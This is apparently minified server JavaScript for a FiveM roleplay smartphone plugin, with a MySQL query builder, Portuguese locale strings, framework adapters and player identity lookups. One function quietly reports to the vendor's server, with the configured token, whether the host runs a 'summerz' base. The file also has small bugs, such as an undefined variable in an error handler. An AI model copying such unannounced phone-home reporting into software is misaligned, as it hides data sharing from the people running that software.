"use strict";
var oP = require("events");

function oQ(t) {
    return t && "object" == typeof t && "default" in t ? t : {
        default: t
    }
}
var oR = oQ(oP);

function oS(t, r, a) {
    t && (config.fluent_debug && console.log("Pushing...", r, "TO", JSON.stringify(t), a), emitNet("smartphone:pusher", t, r, a))
}
const oT = () => Math.floor(Date.now() / 1e3),
    oU = t => require("crypto").createHash("md5").update(String(t)).digest("hex");

function oV(t) {
    for (let r in t) {
        let a = t[r];
        t[r] = "string" == typeof a ? a.trim() : a
    }
    return t
}

function oW(t, ...r) {
    let a = {};
    for (let i of r) i in t && (a[i] = t[i]);
    return a
}

function oX(t, ...r) {
    let a = Object.assign({}, t);
    for (let i of r) delete a[i];
    return a
}

function oY(t) {
    if (Array.isArray(t)) return t.map(oY);
    let r = {};
    for (let [a, i] of Object.entries(t))
        if (null != i) {
            if (a.includes(".")) {
                let [n, s] = a.split(".", 2);
                "object" != typeof r[n] && (r[n] = {}), r[n][s] = i
            } else r[a] = i
        } return r
}

function oZ(t = Date.now()) {
    let r = new Date(t);
    return r.toLocaleString("pt-BR")
}

function p0(t, r = "default", a = 3) {
    let i = p0.map,
        n = i.get(r + t) || 0;
    return i.set(r + t, n + 1), n >= a
}

function p1(t) {
    let r = 0;
    if (0 === t.length) return r;
    for (let a = 0; a < t.length; a++) r = (r << 5) - r + t.charCodeAt(a), r |= 0;
    return r
}

function p2(t) {
    return new Promise(r => setTimeout(r, t))
}

function p3(t, r) {
    let a = {},
        i = {},
        n = async (...n) => {
            let s = p1(JSON.stringify(n));
            return a.hasOwnProperty(s) || (a[s] = await t.apply(null, n), i[s] = setTimeout(() => delete a[s], r)), a[s]
        };
    return n.modify = (t, n) => {
        let s = p1(JSON.stringify(t));
        a.hasOwnProperty(s) && (a[s] = n(a[s]), i[s] && clearTimeout(i[s]), i[s] = setTimeout(() => delete a[s], r))
    }, n.clearKey = t => {
        delete a[t], i[t] && clearTimeout(i[t]), delete i[t]
    }, n.clear = (...t) => n.clearKey(p1(JSON.stringify(t))), n
}

function p4(t, ...r) {
    let a = t;
    for (let i of r) a = a && a[i];
    return a
}

function p5(t) {
    try {
        return exports.smartphone[t], !0
    } catch (r) {
        return !1
    }
}

function p6(t, ...r) {
    return "function" == typeof t && t(...r)
}
p0.map = new Map, p4.func = (t, r, ...a) => {
    let i = t && t[r];
    "function" == typeof i && i.apply(t, a)
};
const p7 = new Map;
Array.prototype.unique = function () {
    return this.filter((t, r, a) => a.indexOf(t) === r)
}, Array.prototype.pluck = function (t) {
    return this.map(r => r[t])
}, Array.prototype.pluckBy = function (t, r) {
    let a = {};
    for (let i of this) a[i[r]] = i[t];
    return a
}, Array.prototype.last = function () {
    return this.length > 0 ? this[this.length - 1] : void 0
}, Array.prototype.first = function (...t) {
    return this.find(r => t.includes(r))
}, String.prototype.format = function (t) {
    return this.replace(/{(\w+)}/g, (r, a) => t[a])
};
class p8 {
    constructor(t) {
        this.error = t
    }
}
const p9 = require("./config.json");

function pa() {
    for (let t of ["oxmysql", "ghmattimysql", "GHMattiMySQL", "haze_mysql", "mysql-async"])
        if ("started" === GetResourceState(t)) return t;
    return console.log("Smartphone:: DRIVER DE BANCO DE DADOS INCOMPAT\xcdVEL"), console.log("Smartphone:: O SCRIPT IRA ASSUMIR QUE VOCE UTILIZA GHMattiMySQL"), "GHMattiMySQL"
}
const pb = {
    driver: p9.db_driver || pa(),
    query(t, r) {
        let a = 0,
            i = {};
        return "haze_mysql" !== this.driver && "oxmysql" !== this.driver && (t = t.replace(/\?/g, () => (i["@" + (a += 1)] = r[a - 1], "@" + a))), pc.debug && console.log(t, JSON.stringify(r)), new Promise((a, n) => {
            switch (this.driver) {
            case "ghmattimysql":
                return global.exports.ghmattimysql.execute(t, i, a);
            case "hydra":
                return a(global.exports.quantum.query(t, i));
            case "oxmysql":
                let s = GetResourceMetadata("oxmysql", "version", 0);
                if (s && !s.startsWith("1.")) return global.exports.oxmysql.query_async(t, r).then(a).catch(a => {
                    console.error('Erro ao executar "' + t + '" com argumentos [' + r + "]"), console.error(a), n(a)
                });
                return global.exports.oxmysql.execute(t, r, a);
            case "haze_mysql":
                return global.exports.haze_mysql.query(t, r, a, n);
            case "GHMattiMySQL":
                return global.exports.GHMattiMySQL.QueryResultAsync(t, i, a);
            case "mysql-async":
                let o = t.match(/INSERT|REPLACE/i) ? "mysql_insert" : "mysql_fetch_all";
                return global.exports["mysql-async"][o](t, i, a)
            }
        })
    }
};

function pc(t) {
    return new pl(t)
}

function pd(t) {
    return Array.isArray(t) && (t = t.length), Array(t).fill("?").join(",")
}
pc.raw = t => ({
    $raw: !0,
    value: t
}), pc.getColumns = t => pb.query("SHOW COLUMNS FROM " + t, []).then(t => t.map(t => t.Field)), pc.query = (t, r = []) => pb.query(t, r);
class pe {
    constructor() {
        this.wheres = []
    }
    where() {
        let [t, r, a, i] = arguments;
        if (t instanceof Function) {
            let n = new pe;
            n.or = i, t(n), this.wheres.push(n)
        } else if (t instanceof Object && !t.$raw)
            for (let s in t) {
                let o = {
                    operator: "="
                };
                o.column = s, o.value = t[s], o.or = i, this.wheres.push(o)
            } else {
                let l = {};
                l.column = t, l.operator = void 0 === a ? "=" : r, l.value = void 0 === a ? r : a, l.or = !!i, this.wheres.push(l)
            }
        return this
    }
    whereOr(...t) {
        return this.where(r => r.orWhere(...t))
    }
    whereIn(t, r, a = !1) {
        return r && 0 !== r.length ? this.where(t, "IN", r, a) : this.where(pc.raw(0), 1)
    }
    orWhereIn(t, r) {
        return this.whereIn(t, r, !0)
    }
    whereNotIn(t, r, a = !1) {
        return r && 0 !== r.length ? this.where(t, "NOT IN", r, a) : this.where(pc.raw(1), 1)
    }
    orWhereNotIn(t, r) {
        return this.whereNotIn(t, r, !0)
    }
    whereBetween(t, r, a) {
        return this.where(t, ">=", r).where(t, "<=", a)
    }
    whereNull(t, r = !1) {
        let a = {
            operator: "IS NULL"
        };
        return a.column = t, a.or = r, this.wheres.push(a), this
    }
    orWhereNull(t) {
        return this.whereNull(t, !0)
    }
    whereNotNull(t, r = !1) {
        let a = {
            operator: "IS NOT NULL"
        };
        return a.column = t, a.or = r, this.wheres.push(a), this
    }
    orWhereNotNull(t) {
        return this.whereNotNull(t, !0)
    }
    orWhere() {
        let [t, r, a] = arguments;
        return this.where(t, a ? r : "=", a || r, !0)
    }
    toSql() {
        let t = "",
            r = [];
        for (let a of this.wheres)
            if (t && (t += a.or ? "OR " : "AND "), a instanceof pe) {
                let {
                    sql: i,
                    values: n
                } = a.toSql();
                t += "(" + i + ") ", r.push(...n)
            } else t += pf(a.column) + " " + a.operator + " ", null != a.value && (Array.isArray(a.value) ? (t += "(" + pd(a.value) + ") ", r.push(...a.value)) : (t += "? ", r.push(a.value)));
        t = t.trim();
        let s = {};
        return s.sql = t, s.values = r, s
    }
}

function pf(t) {
    return t.$raw ? t.value : "*" !== t ? "`" + t + "`" : t
}
class pg extends pe {
    constructor(t) {
        super(), this.table = t
    }
    then(t) {
        let {
            sql: r,
            values: a
        } = super.toSql(), i = "DELETE FROM " + this.table;
        r && (i += " WHERE " + r), pb.query(i, a).then(() => t && t())
    }
}
class ph {
    constructor(t) {
        this.table = t
    }
    insert(t) {
        return this.data = t, this.name = "INSERT", this
    }
    returnKeys() {
        return this.$returnKeys = !0, this
    }
    replace(t) {
        return this.data = t, this.name = "REPLACE", this
    }
    then(t) {
        let r = Object.keys(this.data).map(pf),
            a = Object.values(this.data),
            i = this.name + " INTO " + this.table + " (" + r.join(",") + ") VALUES (" + ",?".repeat(a.length).substr(1) + ")";
        this.$returnKeys && "GHMattiMySQL" === pb.driver && (i += ";SELECT LAST_INSERT_ID() AS id"), pb.query(i, a).then(r => {
            t && t(r.insertId || (r[0] ? r[0].id : r))
        })
    }
}
class pi extends pe {
    constructor(t) {
        super(), this.table = t
    }
    update(t, r) {
        return t && (r ? this.data[t] = r : this.data = t), this
    }
    increment(t, r) {
        let a = {};
        return a.$increment = +r, this.data[t] = a, this
    }
    decrement(t, r) {
        let a = {};
        return a.$increment = -r, this.data[t] = a, this
    }
    then(t) {
        let r = [],
            {
                sql: a,
                values: i
            } = super.toSql(),
            n = Object.entries(this.data).map(([t, a]) => {
                let i = pf(t);
                return a && a.$raw ? i + " = " + a.value : a && a.hasOwnProperty("$increment") ? (r.push(a.$increment), i + " = " + i + " + ?") : (r.push(a), i + " = ?")
            }),
            s = "UPDATE " + this.table + " SET " + n.join(",");
        a && (s += " WHERE " + a), r.push(...i), pb.query(s, r).then(t)
    }
}
class pj {
    constructor(t) {
        this.type = t, this._default = null
    }
    unique() {
        return this.isUnique = !0, this
    }
    increment() {
        return this.isIncrement = !0, this
    }
    primary() {
        return this.isPrimary = !0, this
    }
    default (t) {
        return this._default = t, this
    }
    unsigned() {
        return this.isUnsigned = !0, this
    }
    nullable() {
        return this.isNullable = !0, this
    }
    toSql(t) {
        let r = "`" + t + "` " + this.type + " ";
        return this.isUnsigned && (r += "UNSIGNED "), this.isUnique && (r += "UNIQUE "), this.isIncrement && (r += "AUTO_INCREMENT "), null != this._default && (r += "DEFAULT " + JSON.stringify(this._default) + " "), this.isNullable ? null == this._default && (r += "DEFAULT NULL ") : r += "NOT NULL ", r.trim()
    }
}
class pk {
    constructor(t) {
        this.table = t, this.columns = {}
    }
    id() {
        return this.columns.id = new pj("BIGINT").primary().increment()
    }
    varchar(t, r = 255) {
        return this.columns[t] = new pj("VARCHAR(" + r + ")")
    }
    tinyint(t) {
        return this.columns[t] = new pj("TINYINT")
    }
    int(t) {
        return this.columns[t] = new pj("INT")
    }
    bigint(t) {
        return this.columns[t] = new pj("BIGINT")
    }
    toSql() {
        let t = Object.entries(this.columns).filter(t => t[1].isPrimary).map(t => pf(t[0])),
            r = Object.entries(this.columns).map(([t, r]) => r.toSql(t));
        return "CREATE TABLE IF NOT EXISTS " + this.table + "(" + r.join(", ") + (t.length ? ", PRIMARY KEY(" + t.join(",") + ")" : "") + ") DEFAULT CHARSET=utf8mb4"
    }
}
class pl extends pe {
    constructor(t) {
        super(), this.table = t, this.columns = ["*"], this.$groupBy = [], this.$order = []
    }
    create(t) {
        let r = new pk(this.table);
        return t(r), pb.query(r.toSql(), [])
    }
    createIndex(...t) {
        let r = t.flat(),
            a = r.join("_"),
            i = "CREATE INDEX " + a + "_index ON " + this.table + "(" + r.map(pf).join(",") + ")";
        return pb.query(i, [])
    }
    find(t) {
        return this.where("id", t).first()
    }
    insert(t) {
        let r = new ph(this.table);
        return r.insert(t), r
    }
    replace(t) {
        let r = new ph(this.table);
        return r.replace(t), r
    }
    update(t = {}) {
        let r = new pi(this.table);
        return r.data = t, r.wheres = this.wheres, r
    }
    delete() {
        let t = new pg(this.table);
        return t.wheres = this.wheres, t
    }
    destroy(t) {
        return new pg(this.table).where("id", t)
    }
    select() {
        return this.columns = Array.from(arguments).flat().map(pf), this
    }
    selectAs(t) {
        let r = Object.entries(t);
        return this.columns = r.map(([t, r]) => pf(t) + " AS " + pf(r)), this
    }
    selectRaw() {
        return this.columns = Array.from(arguments).flat(), this
    }
    groupBy() {
        return this.$groupBy = Array.from(arguments).flat().map(pf), this
    }
    orderBy(t, r = "ASC") {
        let a = {};
        return a.column = t, a.order = r, this.$order.push(a), this
    }
    limit(t) {
        return this.$limit = t, this
    }
    first(...t) {
        return t.length && this.select(t), this.$limit = 1, this.$first = !0, this
    }
    exists() {
        return this.columns = ["COUNT(*) as qtd"], new Promise(t => {
            this.then(r => t(p4(r, "0", "qtd") > 0))
        })
    }
    sum(t) {
        return this.columns = ["SUM(" + pf(t) + ") as total"], new Promise(t => {
            this.then(r => t(r && r[0].total || 0))
        })
    }
    count(t = "*") {
        return this.columns = ["COUNT(" + pf(t) + ") as total"], new Promise(t => {
            this.then(r => t(r && r[0].total || 0))
        })
    }
    pluck(t, r) {
        return r ? this.pluckBy(t, r) : ("*" == this.columns[0] && this.select(t), new Promise(r => {
            this.then(a => {
                Array.isArray(a) ? r(a.map(r => r[t])) : r(a ? a[t] : null)
            })
        }))
    }
    pluckBy(t, r) {
        return "*" == this.columns[0] && this.select([t, r]), new Promise(a => {
            this.then(i => {
                let n = {};
                for (let s of [i].flat()) n[s[r]] = s[t];
                a(n)
            })
        })
    }
    then(t) {
        let {
            sql: r,
            values: a
        } = super.toSql(), i = "SELECT " + this.columns.join(",") + " FROM " + this.table;
        if (r && (i += " WHERE " + r), this.$groupBy.length && (i += " GROUP BY " + this.$groupBy.join(",")), this.$order.length) {
            let n = this.$order.map(({
                column: t,
                order: r
            }) => pf(t) + " " + r);
            i += " ORDER BY " + n.join(",")
        }
        this.$limit && (i += " LIMIT " + this.$limit), pb.query(i, a).then(r => {
            t && t(this.$first ? r && r[0] : r)
        })
    }
}
class pm {
    constructor(...t) {
        this.args = t
    }
}

function pn(t) {
    return t instanceof pm ? t.args : null == t ? [] : [t]
}
const po = {
        getInterface(t) {
            let r = {};
            on(t + ":smartphone:proxy_res", (t, a) => {
                r[t] && (r[t](...a), delete r[t])
            });
            let a = {
                _ids: 1
            };
            return new Proxy(a, {
                get: (a, i) => a[i] ? a[i] : a[i] = (...n) => {
                    if (i.startsWith("_")) return emit(t + ":proxy", i.substring(1), n, "smartphone", -1), Promise.resolve(); {
                        let s = ++a._ids;
                        return new Promise((a, o) => {
                            r[s] = a, emit(t + ":proxy", i, n, "smartphone", s), setTimeout(() => {
                                r[s] && o(Error("Proxy took too long to resolve " + i)), delete r[s]
                            }, 32500)
                        })
                    }
                },
                set: (t, r, a) => (t[r] = a, !0)
            })
        },
        bindInterface(t, r) {
            on(t + ":proxy", async (a, i, n, s) => {
                let o = r[a];
                if (o && o.call) {
                    let l = pn(await o(...i));
                    s >= 0 && emit(t + ":" + n + ":proxy_res", s, l)
                } else console.error('Field "' + a + '" does not exists on interface "' + t + '"')
            })
        }
    },
    pp = po.getInterface("quantum"),
    pq = {
        __proto__: null
    };
pq.VProxy = po, pq.quantum = pp;
var pr = Object.freeze(pq);
const ps = {
        INVALID_VALUE: "Valor inv\xe1lido",
        PASSPORT_NOT_FOUND: "Passaporte n\xe3o encontrado",
        PROFILE_NOT_FOUND: "Perfil n\xe3o encontrado",
        PHONE_NOT_FOUND: "N\xfamero n\xe3o encontrado",
        MESSAGE_BLOCKED: "Voc\xea n\xe3o consegue enviar mensagem para este n\xfamero",
        PLAYER_OFFLINE: "Morador fora da cidade",
        NO_PERMISSION: "Sem permiss\xe3o",
        MESSAGE_TOO_LONG: "Mensagem muito grande",
        "USER.NO_ID": "Falha ao buscar seu passaporte",
        "USER.NO_IDENTITY": "Falha ao buscar sua identidade",
        "TRANSFER.LOCK": "Aguarde sua transfer\xeancia anterior",
        "TRANSFER.SELF": "Voc\xea n\xe3o pode transferir para si mesmo",
        "TRANSFER.NO_FUNDS": "Saldo insuficiente",
        "BANK.PIX_NOT_FOUND": "Chave pix n\xe3o encontrada",
        "BANK.PIX_DISABLED": "O pix est\xe1 desativado",
        "BANK.INVOICE_NOT_FOUND": "Fatura n\xe3o encontrada",
        "BANK.INVOICE_SELF": "Voc\xea n\xe3o pode se cobrar",
        "BANK.INVOICE_ALREADY_PAID": "Esta fatura j\xe1 est\xe1 paga",
        "BANK.INVOICE_NOT_YOURS": "Esta fatura n\xe3o \xe9 sua",
        "BANK.INVOICE_REQUEST": "Deseja aceitar a fatura {reason} de {name} no valor de {value}",
        "BANK.INVOICE_NOTIFY_TITLE": "Faturas",
        "BANK.INVOICE_NOTIFY_ACCEPTED": "{name} aceitou sua fatura",
        "BANK.INVOICE_NOTIFY_REJECTED": "{name} recusou sua fatura",
        "CALL.NOT_FOUND": "Esta liga\xe7\xe3o n\xe3o existe mais",
        "CALL.OFFLINE": "N\xfamero fora de \xe1rea",
        "CALL.LOCK": "Voc\xea j\xe1 est\xe1 realizando uma liga\xe7\xe3o",
        "CALL.OCCUPIED": "Esta linha est\xe1 ocupada",
        "INSTAGRAM.POST_NOT_FOUND": "Esta publica\xe7\xe3o n\xe3o foi encontrada",
        "INSTAGRAM.INVALID_USERNAME": "Usu\xe1rio inv\xe1lido, use letras/numeros com o m\xe1ximo de 24 caracteres",
        "INSTAGRAM.INVALID_NAME": "Nome inv\xe1lido",
        "INSTAGRAM.ALREADY_REGISTERED": "Voc\xea j\xe1 possui conta",
        "INSTAGRAM.USERNAME_TAKEN": "Este nome de usu\xe1rio j\xe1 existe",
        "INSTAGRAM.LIMIT_REACHED": "Voc\xea atingiu o m\xe1ximo de contas",
        "INSTAGRAM.REOPEN": "Reabra o aplicativo (comunique a prefeitura)",
        "INSTAGRAM.REPLY": "{name} comentou em sua publica\xe7\xe3o",
        "INSTAGRAM.MENTION": "{name} mencionou voc\xea em uma publica\xe7\xe3o",
        "INSTAGRAM.PUBLISH": "{name} publicou uma foto",
        "INSTAGRAM.LIKE": "{name} curtiu sua publica\xe7\xe3o",
        "INSTAGRAM.FOLLOW": "{name} seguiu voc\xea",
        "INSTAGRAM.WAIT_USERNAME_CHANGE": "Aguarde uma hora para trocar o nome de usu\xe1rio novamente",
        "OLX.INVALID_TITLE": "T\xedtulo inv\xe1lido",
        "OLX.CATEGORY_MANDATORY": "A categoria \xe9 obrigat\xf3ria",
        "OLX.DESCRIPTION_MANDATORY": "A descri\xe7\xe3o \xe9 obrigat\xf3ria",
        "OLX.IMAGE_MANDATORY": "A imagem \xe9 obrigat\xf3ria",
        "OLX.IMAGE_MAXIMUM": "O m\xe1ximo de imagens \xe9 3",
        "SERVICE.UNAVAILABLE": "Servi\xe7o indispon\xedvel no momento",
        "SERVICE.NOT_FOUND": "Este servi\xe7o n\xe3o existe",
        "SERVICE.ALREADY_SOLVED": "Esse chamado j\xe1 foi atendido",
        "TWITTER.INVALID_FORM": "Formul\xe1rio inv\xe1lido",
        "TWITTER.INVALID_USERNAME": "Usu\xe1rio inv\xe1lido",
        "TWITTER.INVALID_NAME": "Nome inv\xe1lido",
        "TWITTER.INVALID_BIO": "Biografia inv\xe1lida",
        "TWITTER.INVALID_TWEET": "Tweet inv\xe1lido",
        "TWITTER.LOGIN_EXPIRED": "Login expirado",
        "TWITTER.USERNAME_TAKEN": "Este nome de usu\xe1rio j\xe1 existe",
        "TWITTER.FAIL_TO_CREATE": "N\xe3o foi poss\xedvel criar sua conta",
        "TWITTER.FAIL_TO_TWEET": "Falha ao cadastrar seu tweet",
        "TWITTER.REPLY": "{name} respondeu seu tweet",
        "TWITTER.RETWEET": "{name} retweetou voc\xea",
        "TWITTER.LIKE": "{name} curtiu seu tweet",
        "TWITTER.FOLLOW": "{name} seguiu voc\xea",
        "WHATSAPP.NUMBER_OUT_GROUP": "Este n\xfamero n\xe3o faz parte do grupo",
        "WHATSAPP.NUMBER_IN_GROUP": "Este n\xfamero j\xe1 est\xe1 no grupo",
        "WHATSAPP.GROUP_NOT_FOUND": "Grupo n\xe3o encontrado",
        "WHATSAPP.GROUP_FULL": "O grupo est\xe1 cheio",
        "WHATSAPP.GROUP_NOT_OWNER": "Voc\xea n\xe3o \xe9 o dono do grupo",
        "WHATSAPP.OWNER_LEAVE": "Voc\xea n\xe3o pode sair do grupo sendo dono",
        "TOR.USER_OFFLINE": "Usu\xe1rio offline",
        "TOR.PAYMENT_NOTIFY": "Voc\xea recebeu {value} de @{user}",
        "TOR.PAYMENT_RECEIPT": "Voc\xea enviou {value} para @{user}",
        "TOR.BLOCKED": "Voc\xea n\xe3o pode acessar este aplicativo"
    },
    pt = ps;

function pu(t) {
    let r = pu.value || "R$";
    return r + " " + t.toLocaleString("pt-BR")
}

function pv(t) {
    pu.value = t
}
RegisterCommand("smartphone-dump-lang", t => {
    0 == t && SaveResourceFile("smartphone", "locale.json", JSON.stringify(pt, null, 4), -1)
});
const pw = LoadResourceFile("smartphone", "locale.json");
if (pw) try {
    Object.assign(pt, JSON.parse(pw))
} catch (sa) {
    console.error("Arquivo de tradu\xe7\xe3o (locale.json) inv\xe1lido!"), console.error(sa.message)
}
const px = require("http"),
    py = require("https");

function pz(t, r) {
    let a = t.startsWith("https") ? py : px;
    r.body && "object" == typeof r.body && (r.body = JSON.stringify(r.body), r.headers["content-type"] = "application/json; charset=utf-8", r.headers["content-length"] = Buffer.from(r.body, "utf-8").length);
    let i = {};
    i.headers = r.headers || {}, i.method = r.method || "GET";
    let n = a.request(t, i);
    return r.body && n.write(r.body), new Promise((t, r) => {
        n.end(), n.on("error", t => r(t)), n.on("response", r => {
            let {
                statusCode: a,
                headers: i,
                statusMessage: n
            } = r, s = "", o = null;
            r.on("data", t => s += t), r.on("end", () => {
                i["content-type"] && i["content-type"].includes("application/json") && (o = JSON.parse(s));
                let r = {};
                r.statusCode = a, r.statusMessage = n, r.headers = i, r.body = s, r.data = o, t(r)
            })
        })
    })
}
pz.get = (t, r = {}) => {
    let a = {
        method: "GET"
    };
    return a.headers = r, pz(t, a)
}, pz.post = (t, r, a = {}) => {
    let i = {
        method: "POST"
    };
    return i.body = r, i.headers = a, pz(t, i)
}, pz.put = (t, r, a = {}) => {
    let i = {
        method: "PUT"
    };
    return i.body = r, i.headers = a, pz(t, i)
}, pz.delete = (t, r = {}) => {
    let a = {
        method: "DELETE"
    };
    return a.headers = r, pz(t, a)
}, pz.patch = (t, r, a = {}) => {
    let i = {
        method: "PATCH"
    };
    return i.body = r, i.headers = a, pz(t, i)
}, pz.deleteManyImages = (...t) => {
    let r = t.filter(t => t && t.includes("jesteriruka.dev")).map(t => t.split("/").pop());
    if (r.length > 0) {
        let a = {};
        a.images = r;
        let i = {};
        return i.authorization = config.token, pz.put("https://fivem.jesteriruka.dev/storage/deleteMany", a, i)
    }
    return Promise.resolve()
}, pz.metadata = (t, r) => {
    let a = {};
    a.key = t, a.value = r;
    let i = {};
    i.authorization = config.token, pz.post("https://fivem.jesteriruka.dev/metadata/6056b4aa1cf80010efb4ed1d", a, i).catch(t => t)
};
var pA = new oR.default;
const pB = require("./config");

function pC(t) {
    let r = JSON.parse(global.LoadResourceFile("smartphone", "config.json"));
    t(r), global.SaveResourceFile("smartphone", "config.json", JSON.stringify(r, null, 4), -1)
}
if (pB.messages && pC(t => delete t.messages), "creative_v3" === pB.base) pp.getBankMoney = pp.getBank, pp.setBankMoney = async (t, r) => {
    let a = await pp.getBank(t),
        i = Math.abs(a - r);
    return a > r ? pp.delBank(t, i) : pp.addBank(t, i)
}, pp.getUsersByPermission = t => pc("permissions").where({
    permiss: t
}).pluck("user_id");
else if ("creative_v4" === pB.base) pp.getBankMoney = pp.getBank, pp.setBankMoney = async (t, r) => {
    let a = r - await pp.getBank(t),
        i = {};
    return i.id = t, i.bank = a, pp.execute("characters/addBank", i)
};
else {
    if ("creative_v5" === pB.base) {
        pB.serverSideProp = !0, pp.getBankMoney = pp.getBank, pp.setBankMoney = async (t, r) => {
            let a = await pp.getBank(t),
                i = Math.abs(a - r);
            return a > r ? pp.delBank(t, i, "Private") : pp.addBank(t, i, "Private")
        };
        let sb = pp.request;
        pp.request = (t, r) => sb(t, r)
    } else "creative_extended" === pB.base && (pB.serverSideProp = !0, pp.getUserSource = pp.getUserSource, pp.getUserId = pp.getUserId, pp.getInventoryItemAmount = pp.getInventoryItemAmount, pp.getUserIdentity = pp.getUserIdentity, pp.hasPermission = pp.hasPermission, pp.request = pp.request, pp.getBankMoney = pp.getBankMoney, pp.setBankMoney = async (t, r) => {
        let a = await pp.GetBank(t),
            i = Math.abs(a - r);
        return a > r ? pp.RemoveBank(t, i, "Private") : pp.GiveBank(t, i, "Private")
    });
    let sb = pp.request;
    pp.request = (t, r) => sb(t, r)
}

function pD(t) {
    return !pB.disabledApps || !pB.disabledApps.includes(t.toLowerCase())
}
async function pE(t, r) {
    if (!r) return !1;
    if (!Array.isArray(r)) return pp.hasPermission(t, r);
    if (pF.hasTable("permissions")) {
        let a = {};
        return a.user_id = t, pc("permissions").where(a).whereIn("permiss", r).exists()
    }
    for (let i of r)
        if (await pp.hasPermission(t, i)) return !0;
    return !1
}("creative_v4" === pB.base || "creative_v5" === pB.base) && (pp.getUserSource = pp.userSource, pp.getUsersByPermission = async t => {
    let r = [];
    for (let a of Object.keys(await pp.userList()).map(Number))(await pp.hasPermission(a, t) || await pp.HasGroup(a, t)) && r.push(a);
    if (!r.length) {
        let i = await pp.NumPermission(t);
        for (let n of i) "number" == typeof n ? r.push(await pp.getUserId(n)) : n && r.push(n.user_id)
    }
    return r
}), pv(pB.client.currency), pc.debug = !!pB.fluent_debug;
const pF = {
        columnsForCache: {},
        tables: [],
        whatThisDoes: !1,
        hasTable(t) {
            return this.tables.includes(t)
        },
        firstTable(...t) {
            return t.find(t => this.tables.includes(t))
        },
        columnsFor: async t => (pF.columnsForCache[t] || (pF.columnsForCache[t] = await pc.getColumns(t)), pF.columnsForCache[t]),
        async hasColumn(t, r) {
            if (pF.hasTable(t)) {
                let a = await pF.columnsFor(t);
                return Array.isArray(r) ? r.every(t => a.includes(t)) : a.includes(r)
            }
            return !1
        },
        async hasColumns(t, ...r) {
            if (pF.hasTable(t)) {
                let a = await pF.columnsFor(t);
                return r.every(t => a.includes(t))
            }
            return !1
        },
        async firstColumn(t, ...r) {
            if (pF.hasTable(t)) {
                let a = await pF.columnsFor(t);
                return r.find(t => a.includes(t))
            }
        },
        onFetch: [],
        fetchTables() {
            return new Promise(async t => {
                for (;;) try {
                    let r = await pc.query("SELECT `table_name` as name FROM information_schema.tables WHERE `TABLE_SCHEMA`=DATABASE()");
                    pF.tables = r.pluck("name");
                    break
                } catch {
                    console.error("Falha ao carregar as tabelas do banco de dados, se isso acontecer muitas vezes, seu conector de banco de dados est\xe1 com problemas"), await p2(1e3)
                }
                for (let a of this.onFetch) try {
                    await a(pF.tables)
                } catch (i) {
                    console.error(e.message)
                }
                if (pF.tables.includes("summerz_characters") || pF.hasTable("summerz_dummy")) pF.whatThisDoes = !0, "getUserSource" in pp || (pp.getUserSource = pp.userSource), pz.metadata("isUsingSummerz", !0);
                else if (pF.hasTable("nyo_character")) {
                    let n = ["getUserSource", "getUserId", "getBankMoney", "setBankMoney", "getUsersByPermission", "hasPermission", "getInventoryItemAmount", "request"];
                    n.forEach(t => {
                        pp[t] = (...r) => global.exports.nyo_modules[t](...r)
                    })
                }
                t(pF.tables)
            })
        },
        ready(t) {
            this.tables.length ? t(this.tables) : this.onFetch.push(t)
        },
        get users() {
            return pc("users")
        },
        get contacts() {
            return pc("smartphone_contacts")
        },
        get settings() {
            return pc("smartphone_settings")
        },
        get phone_calls() {
            return pc("smartphone_calls")
        },
        get phone_blocks() {
            return pc("smartphone_blocks")
        },
        getName: async t => pF.getIdentityByUserId(t).then(t => t && t.name + " " + t.firstname.trim()),
        get userDataTable() {
            return pF.firstTable("user_data", "zuser_data", "summerz_playerdata")
        },
        getTrans(t, r) {
            let a = {};
            return a.Passport = t, Object.assign(a, r), pc(this.userDataTable).where(a).select("*")
        },
        getFines(t, r) {
            let a = {};
            return a.id = t, Object.assign(a, r), pc(this.userDataTable).where(a).select("*")
        },
        getUData(t, r) {
            let a = {};
            return a.user_id = t, a.dkey = r, pc(this.userDataTable).where(a).first().pluck("dvalue")
        },
        setUData(t, r, a) {
            let i = {};
            i.user_id = t, i.dkey = r;
            let n = {};
            return n.dvalue = a, pc(this.userDataTable).where(i).update(n)
        },
        async getIdentitiesBy(t = "user_id", r = []) {
            
            if (0 === r.length) return [];
            if (p5("getIdentitiesBy")) return exports.smartphone.getIdentitiesBy(t, r);
            for (; !pF.tables.length;) await p2(250);
            let a, i = pF.firstTable("user_infos", "characters", "characterdata");
            if (pF.hasTable("nyo_character")) a = await pc("nyo_character").whereIn("user_id" === t ? "id" : t, r).select("id", "firstname", "last_name", "phone");
            else {
                if (pF.hasTable("drip_characters")) return (a = await pc("drip_characters").whereIn(t = "user_id" == t ? "id" : "phone_number", r).select("id", "firstname", "phone_number")).map(t => {
                    let [r, a] = t.name.split(" ", 2), i = String(t.phone_number || t.id + 1e3), n = {};
                    return n.user_id = t.id, n.name = r, n.firstname = a || "", n.phone = i, n
                });
                if (pF.hasTable("summerz_characters")) a = await pc("summerz_characters").whereIn(t = "user_id" == t ? "id" : t, r).select("id", "firstname", "name2", "phone");
                else if (pF.hasTable("summerz_dummy")) a = await pc("characters").whereIn(t = "user_id" == t ? "id" : t, r).select("id", "firstname", "Lastname", "Phone");
                else if (i) {
                    let n = ["user_id", "firstname", "firstname", "phone"];
                    "characterdata" === i && (n[1] = "lastname"), a = await pc(i).whereIn(t, r).select(...n)
                } else if (pF.hasTable("zusers")) a = await pc("zusers").whereIn("user_id" == t ? "id" : t, r);
                else if (pF.hasTable("characters")) a = await pc("characters").whereIn("user_id" == t ? "id" : t, r);
                else if (await pF.hasColumn("users", "phone") && await pF.firstColumn("users", "firstname", "nome", "firstname", "name2")) a = "phone" == t && await pF.hasColumn("users", "dphone") ? await pc("users").whereIn("phone", r).orWhereIn("dphone", r) : await pc("users").whereIn("user_id" == t ? "id" : t, r);
                else {
                    if (!pF.hasTable("user_identities")) return console.error("Identity table not found"), console.error("Debug: " + pF.tables.join(", ")), [];
                    await pF.hasColumn("user_identities", "telefone") && "phone" === t && (t = "telefone"), a = await pc("user_identities").whereIn(t, r)
                }
            }
            
            return a.map(t => ({
                bank: t.bank || t.Bank,
                fines: t.fines || t.Fines,
                user_id: t.user_id || t.id,
                name: t.firstname,
                firstname: t.lastname,
                phone: t.phone 
            }))
        },
        getIdentityByUserId: t => pF.getIdentitiesBy("user_id", [t]).then(t => t && t[0]),
        getIdentityByPhone: t => pF.getIdentitiesBy("phone", [t]).then(t => t && t[0]),
        getIdByPhone: t => pH[t] || pF.getIdentityByPhone(t).then(t => t && t.user_id),
        async getNames(...t) {
            let r = {},
                a = await pF.getIdentitiesBy("user_id", t.flat().unique());
